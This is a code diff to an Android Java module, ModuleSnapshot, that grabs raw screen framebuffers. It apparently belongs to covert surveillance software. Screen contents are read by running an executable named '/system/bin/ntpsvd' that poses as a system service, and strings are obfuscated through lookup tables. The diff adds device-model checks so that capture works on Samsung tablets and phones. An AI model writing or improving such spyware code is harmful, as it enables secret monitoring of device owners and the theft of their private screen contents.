@@ -18,6 +18,8 @@ import java.nio.ByteOrder;
 import android.content.Context;
 import android.graphics.Bitmap;
 import android.graphics.Matrix;
+import android.media.MediaRecorder;
+import android.os.Build;
 import android.view.Display;
 import android.view.Surface;
 import android.view.WindowManager;
@@ -47,6 +49,9 @@ public class ModuleSnapshot extends BaseInstantModule {
 	private static final int MIN_TIMER = 1 * 1000;
 	private static final long SNAPSHOT_DELAY = 1000;
 
+	final Display display = ((WindowManager) Status.getAppContext()
+			.getSystemService(Context.WINDOW_SERVICE)).getDefaultDisplay();
+	
 	/** The Constant CAPTURE_FULLSCREEN. */
 	final private static int CAPTURE_FULLSCREEN = 0;
 
@@ -113,23 +118,22 @@ public class ModuleSnapshot extends BaseInstantModule {
 					if (Cfg.DEBUG) {
 						Check.log(TAG + " (go): Screen powered off, no snapshot");//$NON-NLS-1$
 					}
+					
 					return;
 				}
 
 				final Display display = ((WindowManager) Status.getAppContext()
 						.getSystemService(Context.WINDOW_SERVICE)).getDefaultDisplay();
 
-				int width, height;
+				int width, height, w, h;
 				final int orientation = display.getOrientation();
 
-				int w = display.getWidth();
-				int h = display.getHeight();
-
-				boolean isTab = (w == 600 && h == 1024) || (w == 1024 && h == 600);
-
-				if (isTab) {
+				if (isTablet()) {
 					h = display.getWidth();
 					w = display.getHeight();
+				} else {
+					w = display.getWidth();
+					h = display.getHeight();
 				}
 
 				boolean useOrientation = true;
@@ -150,27 +154,35 @@ public class ModuleSnapshot extends BaseInstantModule {
 				// 0: invertito blu e rosso
 				// 1: perdita info
 				// 2: invertito blu e verde
-				// no ARGB, no ABGR, no AGRB
+				// 3: no ARGB, no ABGR, no AGRB
 				byte[] raw = getRawBitmap();
 
-				if (isTab) {
+				if (raw == null || raw.length == 0) {
+					if (Cfg.DEBUG) {
+						Check.log(TAG + " (actualStart): raw bitmap is null or has 0 length"); //$NON-NLS-1$
+					}
+					
+					return;
+				}
+				
+				if (usesInvertedColors()) {
 					// sul tablet non e' ARGB ma ABGR.
 					byte[] newraw = new byte[raw.length / 2];
 
 					for (int i = 0; i < newraw.length; i++) {
 						switch (i % 4) {
-						case 0:
-							newraw[i] = raw[i + 2]; // A 3:+2
-							break;
-						case 1:
-							newraw[i] = raw[i]; // R 1:+2 2:+1
-							break;
-						case 2:
-							newraw[i] = raw[i - 2]; // G 2:-1 3:-2
-							break;
-						case 3:
-							newraw[i] = raw[i]; // B 1:-2
-							break;
+							case 0:
+								newraw[i] = raw[i + 2]; // A 3:+2
+								break;
+							case 1:
+								newraw[i] = raw[i]; // R 1:+2 2:+1
+								break;
+							case 2:
+								newraw[i] = raw[i - 2]; // G 2:-1 3:-2
+								break;
+							case 3:
+								newraw[i] = raw[i]; // B 1:-2
+								break;
 						}
 						/*
 						 * if (i % 4 == 0) newraw[i] = raw[i + 2]; // A 3:+2
@@ -178,7 +190,9 @@ public class ModuleSnapshot extends BaseInstantModule {
 						 * 2:+1 else if (i % 4 == 2) newraw[i] = raw[i - 2]; //
 						 * G 2:-1 3:-2 else if (i % 4 == 3) newraw[i] = raw[i];
 						 * // B 1:-2
-						 */}
+						 */
+					}
+					
 					raw = newraw;
 				}
 
@@ -192,7 +206,7 @@ public class ModuleSnapshot extends BaseInstantModule {
 
 					int rotateTab = 0;
 
-					if (isTab) {
+					if (isTablet()) {
 						rotateTab = -90;
 					}
 
@@ -232,6 +246,40 @@ public class ModuleSnapshot extends BaseInstantModule {
 
 	}
 
+	private boolean isTablet() {
+		int w = display.getWidth();
+		int h = display.getHeight();
+		
+		if ((w == 600 && h == 1024) || (w == 1024 && h == 600)) {
+			return true;
+		}
+		
+		String model = Build.MODEL.toLowerCase();
+
+		// Samsung Galaxy Tab
+		if (model.contains("gt-p7500")) {
+			return true;
+		}
+		
+		return false;
+	}
+	
+	private boolean usesInvertedColors() {
+		String model = Build.MODEL.toLowerCase();
+
+		// Samsung Galaxy Tab
+		if (model.contains("gt-p7500")) {
+			return true;
+		}
+		
+		// Samsung Galaxy S2
+		if (model.contains("gt-i9100")) {
+			return true;
+		}
+		
+		return false;
+	}
+	
 	private byte[] getAdditionalData() {
 		final String window = Messages.getString("11.1"); //$NON-NLS-1$
 
@@ -285,13 +333,16 @@ public class ModuleSnapshot extends BaseInstantModule {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (getRawBitmap): calling frame generator");
 			}
+			
 			final Process localProcess = Runtime.getRuntime().exec(new String[]{"/system/bin/ntpsvd","fb"});
 			localProcess.waitFor();
+			
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (getRawBitmap): finished calling frame generator");
 			}
 
 			final AutoFile file = new AutoFile(path, Messages.getString("11.3")); //$NON-NLS-1$
+			
 			if (file.exists()) {
 				return file.read();
 			}
